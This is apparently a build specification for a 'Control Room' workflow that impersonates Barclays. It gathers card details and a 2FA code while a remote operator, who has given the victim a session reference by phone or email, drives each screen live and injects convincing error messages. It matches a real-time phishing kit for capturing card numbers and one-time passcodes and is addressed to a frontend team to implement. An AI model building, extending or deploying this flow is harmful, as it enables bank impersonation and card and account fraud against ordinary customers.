_readme: Control Room Workflow Schema — Send this file to your vendor's frontend team.
_error_handling: Each state may have predefined_errors. Your UI should listen for 'operator_error' events and display the message. The operator can also send custom error strings not in this list.
name: Barclays Card & 2FA Verification
description: Customer enters card details for verification, then completes a 2FA challenge. Operator controls approval/rejection at each step.

components_to_build.label: Card Details
predefined_errors: The card number you entered is invalid. Please check and try again.
This card has expired. Please use a different card.
We could not verify the card details provided. Please try again.
This card is not associated with your account.

components_to_build.label: 2FA Verification
predefined_errors: The verification code you entered is incorrect. Please try again.
Your verification code has expired. Please request a new one.
Too many incorrect attempts. Please wait and try again.
We were unable to send a verification code. Please try a different method.

states.label: Card Details
predefined_errors: The card number you entered is invalid. Please check and try again.
This card has expired. Please use a different card.
We could not verify the card details provided. Please try again.
This card is not associated with your account.

states.label: 2FA Verification
predefined_errors: The verification code you entered is incorrect. Please try again.
Your verification code has expired. Please request a new one.
Too many incorrect attempts. Please wait and try again.
We were unable to send a verification code. Please try a different method.

flow: 1. Operator creates a session in the Control Room dashboard → gets reference e.g. 'CR-250515-AB3F'
2. Operator gives reference to the end-user (phone call, email, etc.)
3. User enters reference on your website → your app calls session.connect(ref)
4. Operator controls the flow from dashboard → user's screen updates in real-time
